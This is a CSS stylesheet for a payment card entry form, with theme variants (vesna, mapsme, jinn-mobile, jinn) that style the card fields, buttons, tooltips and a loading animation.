.pay-card_type_vesna .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_vesna .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 60px
}

.pay-card_type_vesna .credit-card-form__label_type_cvv .credit-card-form__error-text,
.pay-card_type_vesna .credit-card-form__tooltip_type_cvv {
	top: 207px;
	left: 150px;
	margin: 0
}

.pay-card_type_vesna .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

.pay-card_type_vesna .credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card_type_vesna .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 2px solid #000
}

.pay-card_type_vesna .credit-card-form__popup .button,
.pay-card_type_vesna .credit-card-form__submit .button {
	color: #fff;
	border-radius: 2px;
	width: 100%;
	height: 36px;
	margin: 0;
	line-height: 36px;
	font-size: 14px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_vesna .credit-card-form__popup .button,
.pay-card_type_vesna .credit-card-form__popup .button:active,
.pay-card_type_vesna .credit-card-form__popup .button:hover,
.pay-card_type_vesna .credit-card-form__submit .button,
.pay-card_type_vesna .credit-card-form__submit .button:active,
.pay-card_type_vesna .credit-card-form__submit .button:hover {
	background: #ff5f56
}

.pay-card_type_vesna .credit-card-form__popup .button {
	width: 70%
}

.pay-card_type_vesna .credit-card-form__tooltip {
	color: #fff;
	background: #000;
	padding: 10px 15px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	text-align: left
}

.pay-card_type_vesna .credit-card-form__tooltip-arrow {
	top: -20px;
	left: 10px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-bottom-color: #000;
	border-width: 10px;
	margin-left: 0
}

.pay-card_type_vesna .credit-card-form__label_type_cvv .credit-card-form__error-text,
.pay-card_type_vesna .credit-card-form__tooltip_type_cvv {
	width: 140px
}

@media screen and (min-width:360px) {
	.pay-card_type_vesna .credit-card-form__label_type_cvv .credit-card-form__error-text,
	.pay-card_type_vesna .credit-card-form__tooltip_type_cvv {
		width: 160px
	}
}

.pay-card_type_vesna .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_vesna .notification-block .title {
	color: #262626;
	font-size: 16px
}

.pay-card_type_vesna .notification-block .paragraph_color_red {
	color: #ff5f56
}

.pay-card_type_vesna .notification-block .payment-info-table__caption {
	border-bottom: 1px solid hsla(0, 0%, 59%, .4);
	background-color: #f1f1f1
}

.pay-card_type_vesna .notification-block .payment-info-table {
	background-color: #f1f1f1
}

.pay-card_type_vesna .notification-block .payment-info-table__caption,
.pay-card_type_vesna .notification-block .payment-info-table__cell,
.pay-card_type_vesna .notification-block .payment-info-table__head {
	font-size: 14px;
	color: rgba(0, 0, 0, .5);
	letter-spacing: -.3px
}

.pay-card_type_vesna .grid-table__row:first-child .payment-info-table__cell,
.pay-card_type_vesna .grid-table__row:first-child .payment-info-table__head {
	padding-top: 10px
}

.control__select_type_vesna-selectBox-dropdown-menu.selectBox-options li a {
	line-height: 40px;
	padding: 0 14px;
	font-size: 16px
}

.control__select_type_vesna-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a {
	background: #ff5f56;
	color: #fff
}

.pay-card_type_mapsme {
	position: relative;
	width: 100%;
	max-width: 360px;
	min-width: 300px;
	margin: 0 auto;
	padding: 5px 15px 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-size: 14px;
	line-height: 19px;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_mapsme .pay-card__card-selector {
	width: auto
}

.pay-card_type_mapsme .pay-card__select-card {
	display: block;
	position: relative
}

.pay-card_type_mapsme .pay-card__select-card:before {
	position: absolute;
	background: #fff;
	border-width: 3px 3px 0;
	border-color: #000 transparent transparent;
	border-style: solid solid inset inset;
	width: auto;
	height: auto;
	top: 50%;
	right: 6px;
	content: "";
	-webkit-transform: translateY(-7px);
	-o-transform: translateY(-7px);
	transform: translateY(-7px)
}

select.control__select_type_mapsme {
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_mapsme .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_mapsme .control__select.selectBox-dropdown .selectBox-label {
	padding: 4px 0
}

.pay-card_type_mapsme .pay-card__select-card .control__select {
	width: 100%;
	height: 40px;
	padding: 4px 12px;
	margin: 0 0 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 0;
	background: #fff;
	font-size: 16px
}

.pay-card_type_mapsme .pay-card__remove-card {
	display: inline-block;
	margin: 0 0 5px;
	color: rgba(0, 0, 0, .54);
	line-height: 18px
}

.pay-card_type_mapsme .pay-card__remove-card-icon {
	padding-right: 5px
}

.pay-card_type_mapsme .pay-card__card {
	width: auto
}

.pay-card_type_mapsme .pay-card__card_type_added-card .credit-card-form__label-group_type_add-card {
	display: none
}

.pay-card_type_mapsme .pay-card__message {
	text-align: left
}

.pay-card_type_mapsme .credit-card-form__card-wrapper {
	position: relative
}

.pay-card_type_mapsme .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_mapsme .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: auto;
	height: 212px;
	margin: 0 auto 10px;
	padding: 15px;
	background: #ededed;
	border-radius: 12px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_mapsme_global .credit-card-form__card_position_front {
	height: 180px
}

.pay-card_type_mapsme .payment-systems-icons {
	top: 0;
	margin: 0 0 10px;
	float: left
}

.pay-card_type_mapsme .payment-systems-icon_name_maestro,
.pay-card_type_mapsme .payment-systems-icon_name_mastercard {
	top: 4px
}

.pay-card_type_mapsme_global .payment-systems-icons {
	position: absolute;
	top: 20px;
	right: 20px
}

.pay-card_type_mapsme .payment-systems-icon {
	float: right;
	margin: 0 10px 0 0
}

.pay-card_type_mapsme_global .payment-systems-icon {
	float: right;
	margin: 0
}

.pay-card_type_mapsme_global .payment-systems-icon_name_amex,
.pay-card_type_mapsme_global .payment-systems-icon_name_bankontact,
.pay-card_type_mapsme_global .payment-systems-icon_name_dinersclub,
.pay-card_type_mapsme_global .payment-systems-icon_name_jcb {
	top: 5px
}

.pay-card_type_mapsme_global .payment-systems-icon_name_maestro,
.pay-card_type_mapsme_global .payment-systems-icon_name_mastercard {
	top: 1px
}

.pay-card_type_mapsme_global .payment-systems-icon_disabled_yes {
	display: none
}

.pay-card_type_mapsme .credit-card-form__label-group_type_card-number {
	clear: both;
	margin: 0 0 10px
}

.pay-card_type_mapsme .credit-card-form__title {
	margin: 0 0 5px;
	text-transform: none;
	font-size: 14px;
	color: #262626
}

.pay-card_type_mapsme .credit-card-form__input {
	height: 40px;
	background: #fff;
	border-color: #ccc;
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_mapsme .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 14px
}

.pay-card_type_mapsme .credit-card-form__label-group_type_add-card .credit-card-form__input,
.pay-card_type_mapsme .credit-card-form__title_type_expiration-date,
.pay-card_type_mapsme .pay-card__select-card .control-label__text {
	display: none
}

.pay-card_type_mapsme .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_mapsme .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_mapsme .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 90px
}

.pay-card_type_mapsme .credit-card-form__label-group_type_add-card {
	margin: 0 0 10px
}

.pay-card_type_mapsme .credit-card-form__label_type_cvv {
	margin: 0 0 0 60px;
	width: 60px;
	position: relative
}

.pay-card_type_mapsme .credit-card-form__cvv-icon,
.pay-card_type_mapsme .credit-card-form__cvv-icon:hover,
.pay-card_type_mapsme .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	height: 20px;
	width: 20px
}

.pay-card_type_mapsme .credit-card-form__cvv-icon {
	position: relative;
	display: inline-block;
	top: 35px;
	left: 10px;
	border-radius: 10px;
	background-image: none;
	background-color: #999;
	text-align: center;
	color: #fff;
	cursor: pointer
}

.pay-card_type_mapsme .credit-card-form__cvv-icon:hover {
	background-color: #1e96f0
}

.pay-card_type_mapsme .credit-card-form__cvv-icon:before {
	display: inline-block;
	content: "?";
	font-weight: 700;
	font-size: 15px
}

.pay-card_type_mapsme .credit-card-form__terms {
	font-size: 14px;
	line-height: 19px;
	color: rgba(0, 0, 0, .54)
}

.pay-card_type_mapsme .credit-card-form__terms-link {
	color: #1e96f0
}

.pay-card_type_mapsme .credit-card-form__error-text {
	left: 20px;
	color: #fff;
	background: #000;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding: 10px 15px;
	font-size: 14px;
	margin-top: 10px;
	z-index: 1
}

.pay-card_type_mapsme .credit-card-form__error-text:before {
	position: absolute;
	top: -20px;
	left: 10px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-bottom-color: #000;
	border-width: 10px
}

.pay-card_type_mapsme .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_mapsme .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 60px
}

.pay-card_type_mapsme .credit-card-form__label_type_cvv .credit-card-form__error-text,
.pay-card_type_mapsme .credit-card-form__tooltip_type_cvv {
	top: 75px;
	left: 0;
	margin: 0;
	white-space: normal
}

.pay-card_type_mapsme .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

.pay-card_type_mapsme .credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card_type_mapsme .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 2px solid #000
}

.pay-card_type_mapsme .credit-card-form__popup .button:first-child,
.pay-card_type_mapsme .credit-card-form__submit .button:first-child {
	margin-top: 0
}

.pay-card_type_mapsme .credit-card-form__popup .button,
.pay-card_type_mapsme .credit-card-form__submit .button {
	color: #fff;
	border-radius: 2px;
	width: 100%;
	height: 36px;
	margin: 0;
	line-height: 36px;
	font-size: 14px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	margin-top: 10px
}

.pay-card_type_mapsme .credit-card-form__popup .button,
.pay-card_type_mapsme .credit-card-form__popup .button:active,
.pay-card_type_mapsme .credit-card-form__popup .button:hover,
.pay-card_type_mapsme .credit-card-form__submit .button,
.pay-card_type_mapsme .credit-card-form__submit .button:active,
.pay-card_type_mapsme .credit-card-form__submit .button:hover {
	background: #1e96f0
}

.pay-card_type_mapsme .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_mapsme .credit-card-form__submit .button.button_disabled_yes {
	border-radius: 2px
}

.pay-card_type_mapsme .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_mapsme .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_mapsme .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_mapsme .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_mapsme .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_mapsme .credit-card-form__submit .button.button_disabled_yes:hover {
	background: #dfdfdf;
	color: #fff;
	cursor: default
}

.pay-card_type_mapsme .credit-card-form__popup .button.button__light,
.pay-card_type_mapsme .credit-card-form__submit .button.button__light {
	color: rgba(0, 0, 0, .54);
	border-radius: 2px;
	background: #f0f0f0
}

.pay-card_type_mapsme .credit-card-form__popup .button.button__light:active,
.pay-card_type_mapsme .credit-card-form__popup .button.button__light:hover,
.pay-card_type_mapsme .credit-card-form__submit .button.button__light:active,
.pay-card_type_mapsme .credit-card-form__submit .button.button__light:hover {
	background: #ededed
}

.pay-card_type_mapsme .credit-card-form__popup .button.button__light:focus,
.pay-card_type_mapsme .credit-card-form__submit .button.button__light:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_mapsme .credit-card-form__popup .button.button__light.button_disabled_yes,
.pay-card_type_mapsme .credit-card-form__submit .button.button__light.button_disabled_yes {
	border-radius: 2px
}

.pay-card_type_mapsme .credit-card-form__popup .button.button__light.button_disabled_yes,
.pay-card_type_mapsme .credit-card-form__popup .button.button__light.button_disabled_yes:active,
.pay-card_type_mapsme .credit-card-form__popup .button.button__light.button_disabled_yes:hover,
.pay-card_type_mapsme .credit-card-form__submit .button.button__light.button_disabled_yes,
.pay-card_type_mapsme .credit-card-form__submit .button.button__light.button_disabled_yes:active,
.pay-card_type_mapsme .credit-card-form__submit .button.button__light.button_disabled_yes:hover {
	background: #dfdfdf;
	color: #fff;
	cursor: default
}

.pay-card_type_mapsme .credit-card-form__popup .button {
	width: 70%
}

.pay-card_type_mapsme .credit-card-form__tooltip {
	color: #fff;
	background: #000;
	padding: 10px 15px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	text-align: left
}

.pay-card_type_mapsme .credit-card-form__tooltip-arrow {
	top: -20px;
	left: 10px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-bottom-color: #000;
	border-width: 10px;
	margin-left: 0
}

.pay-card_type_mapsme .credit-card-form__label_type_cvv .credit-card-form__error-text,
.pay-card_type_mapsme .credit-card-form__tooltip_type_cvv {
	width: 140px
}

@media screen and (min-width:360px) {
	.pay-card_type_mapsme .credit-card-form__label_type_cvv .credit-card-form__error-text,
	.pay-card_type_mapsme .credit-card-form__tooltip_type_cvv {
		width: 160px
	}
}

.pay-card_type_mapsme .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_mapsme .notification-block .paragraph_color_red,
.pay-card_type_mapsme .notification-block .title {
	color: #666
}

.pay-card_type_mapsme .notification-block .link {
	color: #1e96f0
}

.pay-card_type_mapsme .notification-block .payment-info-table__caption {
	border-bottom: 1px solid hsla(0, 0%, 59%, .4);
	background-color: #f1f1f1
}

.pay-card_type_mapsme .notification-block .payment-info-table {
	background-color: #f1f1f1
}

.pay-card_type_mapsme .notification-block .payment-info-table__caption,
.pay-card_type_mapsme .notification-block .payment-info-table__cell,
.pay-card_type_mapsme .notification-block .payment-info-table__head {
	font-size: 14px;
	color: rgba(0, 0, 0, .5);
	letter-spacing: -.3px
}

.pay-card_type_mapsme .grid-table__row:first-child .payment-info-table__cell,
.pay-card_type_mapsme .grid-table__row:first-child .payment-info-table__head {
	padding-top: 10px
}

.control__select_type_mapsme-selectBox-dropdown-menu.selectBox-options li a {
	line-height: 40px;
	padding: 0 14px;
	font-size: 16px
}

.control__select_type_mapsme-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a {
	background: #1e96f0;
	color: #fff
}

.body_background_jinn-mobile {
	height: 100%
}

.pay-card-layout_type_jinn-mobile {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	padding: 15px 10px 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	min-height: 100%;
	margin: 0 auto;
	max-width: 420px
}

.pay-card_type_jinn-mobile .credit-card-form__popup-overlay {
	position: fixed;
	top: 0;
	bottom: 0;
	left: 0;
	right: 0;
	z-index: 3
}

.pay-card_type_jinn-mobile {
	position: static;
	width: 100%;
	min-width: 250px;
	margin: 0 auto;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-size: 13px;
	line-height: 17px;
	color: #797979;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_jinn-mobile .pay-card__row {
	position: relative;
	padding: 0
}

.pay-card_type_jinn-mobile .credit-card-form__label-group_type_add-card,
.pay-card_type_jinn-mobile .pay-card__card-selector,
.pay-card_type_jinn-mobile .pay-card__remove-card,
.pay-card_type_jinn-mobile .pay-card__remove-card-icon,
.pay-card_type_jinn-mobile .pay-card__remove-card-text {
	display: none!important
}

.pay-card_type_jinn-mobile .pay-card__card {
	width: auto
}

.pay-card_type_jinn-mobile .pay-card__card_type_added-card {
	padding-top: 0
}

.pay-card_type_jinn-mobile .pay-card__message {
	text-align: left
}

.pay-card_type_jinn-mobile .credit-card-form__card-wrapper {
	position: relative;
	margin-bottom: 15px
}

.pay-card_type_jinn-mobile .credit-card-form__form {
	padding: 0;
	text-align: left
}

.pay-card_type_jinn-mobile .credit-card-form__card_position_front {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	width: auto;
	height: auto;
	margin: 0 auto;
	padding: 20px;
	background: #659cd5;
	border-radius: 8px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_jinn-mobile .credit-card-form__card-wrapper .payment-systems-icons {
	display: none
}

.pay-card-layout_type_jinn-mobile .payment-systems-icons {
	margin: auto auto 15px;
	width: 100%;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-pack: justify;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	opacity: .3;
	padding: 0 28px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_jinn-mobile .credit-card-form__label-group_type_card-number,
.pay-card_type_jinn-mobile .credit-card-form__label-group_type_expiration-date {
	margin: 0 0 10px;
	padding: 0
}

.pay-card_type_jinn-mobile .credit-card-form__label-group_type_holder-name {
	margin: 0;
	-webkit-box-ordinal-group: 2;
	-webkit-order: 1;
	order: 1
}

.pay-card_type_jinn-mobile .control-label__text,
.pay-card_type_jinn-mobile .credit-card-form__title {
	display: block;
	margin: 0;
	text-transform: none;
	font-size: 13px;
	color: hsla(0, 0%, 100%, .8);
	line-height: 17px;
	letter-spacing: -.1px;
	padding-bottom: 3px
}

.pay-card_type_jinn-mobile .credit-card-form__input {
	height: 32px;
	line-height: 32px;
	color: #333;
	background: #fff;
	border-color: transparent transparent hsla(0, 0%, 100%, .2);
	border-radius: 2px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 16px;
	padding: 0 10px;
	letter-spacing: -.3px
}

.pay-card_type_jinn-mobile .credit-card-form__input::-webkit-input-placeholder {
	color: #e7e7e7;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_jinn-mobile .credit-card-form__input::-moz-placeholder {
	color: #e7e7e7;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_jinn-mobile .credit-card-form__input::placeholder {
	color: #e7e7e7;
	text-transform: none;
	letter-spacing: .5px
}

.pay-card_type_jinn-mobile .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none;
	border-color: transparent transparent #fff
}

.pay-card_type_jinn-mobile .credit-card-form__input[disabled] {
	opacity: .7
}

.pay-card_type_jinn-mobile .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_jinn-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	display: inline-block;
	width: 110px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_jinn-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label.credit-card-form__label_type_cvv {
	width: 65px
}

.pay-card_type_jinn-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_jinn-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 100%
}

.pay-card_type_jinn-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	float: right;
	margin: 0;
	padding: 0
}

.pay-card_type_jinn-mobile .credit-card-form__terms {
	width: 60%;
	margin: 20px auto 15px;
	text-align: center;
	font-size: 11px;
	color: #797979;
	letter-spacing: .1px
}

@media (max-width:320px) {
	.pay-card_type_jinn-mobile .credit-card-form__terms {
		width: 80%
	}
}

.pay-card_type_jinn-mobile .credit-card-form__terms-link {
	color: #ff9b00
}

.pay-card_type_jinn-mobile .credit-card-form__error-text,
.pay-card_type_jinn-mobile .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

.pay-card_type_jinn-mobile .credit-card-form__label,
.pay-card_type_jinn-mobile .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card_type_jinn-mobile .credit-card-form__label_error_yes:after {
	position: absolute;
	bottom: 0;
	right: 10px;
	-webkit-transform: translateY(-50%);
	-o-transform: translateY(-50%);
	transform: translateY(-50%);
	width: 16px;
	height: 16px;
	text-align: center;
	content: "!";
	background: #ff2e2e;
	border-radius: 50%;
	font-size: 13px;
	line-height: 15px;
	font-weight: 700;
	color: #fff
}

.pay-card_type_jinn-mobile .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none
}

.pay-card_type_jinn-mobile .credit-card-form__submit-inner {
	margin: 0 20px 20px
}

.pay-card_type_jinn-mobile .credit-card-form__popup .button,
.pay-card_type_jinn-mobile .credit-card-form__submit .button {
	color: #fff;
	border-radius: 28px;
	width: 100%;
	height: 44px;
	margin: 0;
	line-height: 44px;
	font-size: 15px;
	font-weight: 400;
	text-transform: none;
	letter-spacing: -.2px
}

.pay-card_type_jinn-mobile .credit-card-form__popup .button,
.pay-card_type_jinn-mobile .credit-card-form__popup .button:active,
.pay-card_type_jinn-mobile .credit-card-form__popup .button:hover,
.pay-card_type_jinn-mobile .credit-card-form__submit .button,
.pay-card_type_jinn-mobile .credit-card-form__submit .button:active,
.pay-card_type_jinn-mobile .credit-card-form__submit .button:hover {
	background: #ff9b00
}

.pay-card_type_jinn-mobile .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_jinn-mobile .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_jinn-mobile .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_jinn-mobile .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_jinn-mobile .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_jinn-mobile .credit-card-form__submit .button.button_disabled_yes:hover {
	background: #c6c6c6;
	color: #fff;
	cursor: default
}

.pay-card_type_jinn-mobile .credit-card-form__popup .button {
	width: auto;
	padding: 0 24px
}

.body_background_jinn-mobile .notification-block .title,
.pay-card_type_jinn-mobile .credit-card-form__popup .info-block .title {
	margin: 0 0 25px;
	font-size: 20px;
	line-height: 24px;
	color: #2a2a2a
}

.body_background_jinn-mobile .info-block .paragraph,
.pay-card_type_jinn-mobile .credit-card-form__popup .info-block .paragraph {
	margin: 0 0 35px;
	font-size: 13px;
	line-height: 17px;
	color: #797979
}

.pay-card_type_jinn-mobile .credit-card-form__popup .info-block .paragraph_color_red {
	color: #797979
}

.pay-card_type_jinn-mobile .credit-card-form__popup .notification-block .payment-info-table-wrapper {
	padding: 0 20px;
	background: #fff;
	border-top: 1px solid #ebebeb;
	border-bottom: 1px solid #ebebeb
}

.pay-card_type_jinn-mobile .credit-card-form__popup .notification-block .payment-info-table {
	padding: 0;
	border-top: none
}

.pay-card_type_jinn-mobile .credit-card-form__popup .notification-block .payment-info-table__caption {
	border-top: none;
	border-bottom: none
}

.pay-card_type_jinn-mobile .credit-card-form__popup .notification-block .payment-info-table,
.pay-card_type_jinn-mobile .credit-card-form__popup .notification-block .payment-info-table__caption {
	background: #fff
}

.pay-card_type_jinn-mobile .credit-card-form__popup .notification-block .payment-info-table__caption,
.pay-card_type_jinn-mobile .credit-card-form__popup .notification-block .payment-info-table__head {
	padding: 15px 0;
	font-size: 16px;
	line-height: 24px;
	color: #2a2a2a
}

.pay-card_type_jinn-mobile .credit-card-form__popup .notification-block .payment-info-table__head {
	border-top: 1px solid #ebebeb
}

.pay-card_type_jinn-mobile .credit-card-form__popup .notification-block .payment-info-table__cell {
	padding: 15px 0;
	font-size: 13px;
	line-height: 17px;
	color: #797979;
	border-top: 1px solid #ebebeb;
	text-align: right
}

.pay-card_type_jinn-mobile .notification-block .payment-info-table {
	background-color: #f1f1f1
}

.pay-card_type_jinn-mobile .notification-block .payment-info-table__caption,
.pay-card_type_jinn-mobile .notification-block .payment-info-table__cell,
.pay-card_type_jinn-mobile .notification-block .payment-info-table__head {
	letter-spacing: -.3px
}

.pay-card_type_jinn-mobile .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card_type_jinn-mobile .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 15px
}

.secure-information_type_jinn-mobile {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: none;
	margin: 0 auto 15px;
	text-align: center
}

.secure-information_type_jinn-mobile .secure-information__icon {
	position: absolute;
	left: 0;
	margin: 0;
	top: 50%;
	-webkit-transform: translateY(-50%);
	-o-transform: translateY(-50%);
	transform: translateY(-50%)
}

.secure-information_type_jinn-mobile .secure-information__text {
	position: relative;
	display: inline-block;
	padding-left: 35px;
	color: #797979;
	font-size: 11px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	-webkit-font-smoothing: antialiased;
	letter-spacing: .1px;
	text-align: left
}

.pay-card-layout_type_jinn-mobile .credit-card-form__columns {
	margin: 0 20px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.pay-card-layout_type_jinn-mobile .credit-card-form__column_type_left,
.pay-card-layout_type_jinn-mobile .credit-card-form__column_type_right {
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_jinn-mobile .credit-card-form__column_type_left {
	text-align: left
}

.pay-card-layout_type_jinn-mobile .credit-card-form__column_title {
	color: #797979;
	font-size: 14px;
	letter-spacing: -.15px
}

.pay-card-layout_type_jinn-mobile .credit-card-form__column_type_right {
	text-align: right
}

.pay-card-layout_type_jinn-mobile .credit-card-form__column_value {
	color: #333;
	font-size: 16px;
	letter-spacing: -.32px
}

.jinn-mobile-icon_name_preloader {
	width: 45px;
	height: 30px;
	position: fixed;
	top: 50%;
	left: 50%;
	z-index: 999;
	-webkit-transform: translate3d(-50%, -50%, 0);
	transform: translate3d(-50%, -50%, 0)
}

.jinn-mobile-icon_name_preloader:after,
.jinn-mobile-icon_name_preloader:before {
	content: "";
	width: 15px;
	height: 15px;
	border-radius: 50%;
	position: absolute;
	top: 50%
}

.jinn-mobile-icon_name_preloader:before {
	background-color: #4a90e2;
	left: 50%;
	-webkit-animation: jinn-mobile-animation_type_left-ball 1.8s infinite ease-in-out;
	-o-animation: jinn-mobile-animation_type_left-ball 1.8s infinite ease-in-out;
	animation: jinn-mobile-animation_type_left-ball 1.8s infinite ease-in-out
}

.jinn-mobile-icon_name_preloader:after {
	background-color: #ff9b00;
	right: 50%;
	-webkit-animation: jinn-mobile-animation_type_right-ball 1.8s infinite ease-in-out;
	-o-animation: jinn-mobile-animation_type_right-ball 1.8s infinite ease-in-out;
	animation: jinn-mobile-animation_type_right-ball 1.8s infinite ease-in-out
}

.pay-card-layout_type_jinn-mobile .credit-card-form__column {
	font-family: Roboto, Arial, sans-serif
}

@-webkit-keyframes jinn-mobile-animation_type_left-ball {
	0%,
	to {
		-webkit-transform: translate3d(50%, -50%, 0);
		transform: translate3d(50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(-150%, -50%, 0);
		transform: translate3d(-150%, -50%, 0)
	}
}

@-o-keyframes jinn-mobile-animation_type_left-ball {
	0%,
	to {
		transform: translate3d(50%, -50%, 0)
	}
	50% {
		transform: translate3d(-150%, -50%, 0)
	}
}

@keyframes jinn-mobile-animation_type_left-ball {
	0%,
	to {
		-webkit-transform: translate3d(50%, -50%, 0);
		transform: translate3d(50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(-150%, -50%, 0);
		transform: translate3d(-150%, -50%, 0)
	}
}

@-webkit-keyframes jinn-mobile-animation_type_right-ball {
	0%,
	to {
		-webkit-transform: translate3d(-50%, -50%, 0);
		transform: translate3d(-50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(150%, -50%, 0);
		transform: translate3d(150%, -50%, 0)
	}
}

@-o-keyframes jinn-mobile-animation_type_right-ball {
	0%,
	to {
		transform: translate3d(-50%, -50%, 0)
	}
	50% {
		transform: translate3d(150%, -50%, 0)
	}
}

@keyframes jinn-mobile-animation_type_right-ball {
	0%,
	to {
		-webkit-transform: translate3d(-50%, -50%, 0);
		transform: translate3d(-50%, -50%, 0)
	}
	50% {
		-webkit-transform: translate3d(150%, -50%, 0);
		transform: translate3d(150%, -50%, 0)
	}
}

.body_background_jinn {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-orient: vertical;
	-webkit-box-direction: normal;
	-webkit-flex-direction: column;
	flex-direction: column;
	height: auto;
	min-height: 100%;
	position: relative
}

.body_background_jinn,
.credit-card-form__popup_type_jinn,
.pay-card_type_jinn .credit-card-form__popup,
.pay-card_type_jinn .credit-card-form__popup .notification-block {
	background: #f8f8f8
}

.pay-card_type_jinn .credit-card-form__popup-overlay {
	position: fixed;
	top: 0;
	bottom: 0;
	left: 0;
	right: 0;
	z-index: 3
}

.pay-card_type_jinn {
	position: static;
	width: 100%;
	max-width: 510px;
	margin: 0 auto;
	padding: 20px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
